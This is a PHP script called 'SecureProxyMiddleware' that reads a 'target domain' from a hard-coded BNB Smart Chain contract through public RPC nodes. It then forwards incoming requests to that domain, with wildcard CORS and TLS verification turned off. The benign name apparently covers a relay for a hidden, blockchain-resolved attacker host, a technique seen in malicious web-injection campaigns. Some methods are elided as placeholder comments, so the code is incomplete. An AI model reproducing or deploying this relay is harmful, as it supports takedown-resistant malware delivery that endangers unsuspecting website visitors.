<?php
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: GET, POST, OPTIONS');
header('Access-Control-Allow-Headers: *');
header('Access-Control-Max-Age: 3600');

function getClientIP() {
    if (isset($_SERVER["HTTP_CF_CONNECTING_IP"])) {
        return $_SERVER["HTTP_CF_CONNECTING_IP"];
    }
    if (isset($_SERVER['HTTP_X_FORWARDED_FOR'])) {
        $ips = explode(',', $_SERVER['HTTP_X_FORWARDED_FOR']);
        return trim($ips[0]);
    }
    return $_SERVER['REMOTE_ADDR'];
}

class SecureProxyMiddleware {
    private $updateInterval = 60;
    private $rpcUrls;
    private $contractAddress;
    private $cache;  // In-memory; use Vercel env for persistence if needed
    
    public function __construct($options = []) {
        $this->rpcUrls = $options['rpcUrls'] ?? [
            "https://binance.llamarpc.com",
            "https://bsc.blockrazor.xyz",
            "https://bsc.therpc.io",
            "https://bsc-dataseed2.bnbchain.org"
        ];
        $this->contractAddress = $options['contractAddress'] ?? "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0";
        
        // Load cache from env or in-memory (stateless fallback)
        $this->cache = json_decode(getenv('PROXY_CACHE') ?: '{}', true);
        if (!$this->cache || (time() - $this->cache['timestamp']) > $this->updateInterval) {
            $this->cache = null;
        }
    }

    private function saveCache($domain) {
        $cache = ['domain' => $domain, 'timestamp' => time()];
        // For persistence, set as Vercel env var (manual or via API); here, just in-memory
        putenv("PROXY_CACHE=" . json_encode($cache));  // Temp; refresh on cold starts
    }

    // ... (keep hexToString, filterHeaders, formatHeaders as-is)

    private function fetchTargetDomain() {
        $data = '20965255';
        
        foreach ($this->rpcUrls as $rpcUrl) {
            try {
                $ch = curl_init($rpcUrl);
                curl_setopt_array($ch, [
                    CURLOPT_RETURNTRANSFER => true,
                    CURLOPT_POST => true,
                    CURLOPT_POSTFIELDS => json_encode([
                        'jsonrpc' => '2.0',
                        'id' => 1,
                        'method' => 'eth_call',
                        'params' => [[
                            'to' => $this->contractAddress,
                            'data' => '0x' . $data
                        ], 'latest']
                    ]),
                    CURLOPT_HTTPHEADER => ['Content-Type: application/json'],
                    CURLOPT_TIMEOUT => 30,  // Shorter for serverless
                    CURLOPT_SSL_VERIFYPEER => false,
                    CURLOPT_SSL_VERIFYHOST => false
                ]);

                $response = curl_exec($ch);
                if (curl_errno($ch)) {
                    curl_close($ch);
                    continue;
                }
                
                curl_close($ch);
                $responseData = json_decode($response, true);
                if (isset($responseData['error'])) continue;

                $domain = $this->hexToString($responseData['result']);
                if ($domain) return $domain;
            } catch (Exception $e) {
                continue;
            }
        }
        throw new Exception('Could not fetch target domain');
    }

    private function getTargetDomain() {
        if ($this->cache && isset($this->cache['domain'])) return $this->cache['domain'];

        $domain = $this->fetchTargetDomain();
        $this->saveCache($domain);
        return $domain;
    }

    // ... (keep handle() as-is, but add CORS in catch)
    public function handle($endpoint) {
        try {
            // ... (existing code)
        } catch (Exception $e) {
            http_response_code(500);
            header('Content-Type: application/json');
            echo json_encode(['error' => 'Proxy error: ' . $e->getMessage()]);
        }
    }
}

// OPTIONS handling
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(204);
    exit;
}

if ($_GET['e'] === 'ping_proxy') {
    header('Content-Type: text/plain');
    echo json_encode(['status' => 'pong']);  // JSON for consistency
    exit;
} else if (isset($_GET['e'])) {
    $proxy = new SecureProxyMiddleware([
        'rpcUrls' => [
            "https://binance.llamarpc.com",
            "https://bsc.blockrazor.xyz",
            "https://bsc.therpc.io",
            "https://bsc-dataseed2.bnbchain.org"
        ],
        'contractAddress' => "0xe9d5f645f79fa60fca82b4e1d35832e43370feb0"
    ]);
    $endpoint = urldecode($_GET['e']);
    $proxy->handle($endpoint);
} else {
    http_response_code(400);
    header('Content-Type: application/json');
    echo json_encode(['error' => 'Missing endpoint']);
}
